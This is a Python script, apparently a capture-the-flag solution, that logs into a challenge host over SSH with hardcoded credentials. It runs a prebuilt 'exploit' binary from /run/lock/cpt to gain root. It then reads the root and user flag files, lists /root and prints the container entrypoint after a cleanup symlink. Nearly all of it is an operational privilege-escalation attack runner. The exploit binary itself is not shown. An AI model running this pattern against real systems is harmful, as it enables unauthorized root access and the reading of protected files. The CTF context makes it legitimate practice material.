#!/usr/bin/env python3
"""Final root capture: user flag, root flag, and challenge setup context."""
import time

import paramiko

HOST = "0.cloud.chals.io"
PORT = 32779
USER = "maya.chen"
PASS = "Onboard-Maya25!"

CMDS = [
    "id",
    "cat /root/root.txt",
    "cat /home/maya.chen/.local/share/acme-agent/.vault/user.txt",
    "ls -la /root/",
    "ln -sf /run/lock/cpt/libnss_x /dev/null 2>/dev/null; cat /entrypoint.sh",
]


def drain(chan, secs):
    buf = b""
    end = time.time() + secs
    while time.time() < end:
        try:
            d = chan.recv(65536)
            if not d:
                break
            buf += d
        except Exception:
            time.sleep(0.2)
    return buf.decode(errors="replace")


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS,
              timeout=30, allow_agent=False, look_for_keys=False)
    chan = c.invoke_shell()
    chan.settimeout(1)
    time.sleep(1.2)
    try:
        chan.recv(65536)
    except Exception:
        pass
    chan.send("cd /run/lock/cpt && ./exploit\n")
    out = drain(chan, 6)
    print(out)
    if "password" in out.lower():
        print("!! missed")
        c.close()
        return
    for cmd in CMDS:
        print("$ " + cmd)
        chan.send(cmd + "\n")
        print(drain(chan, 3))
    c.close()


if __name__ == "__main__":
    main()
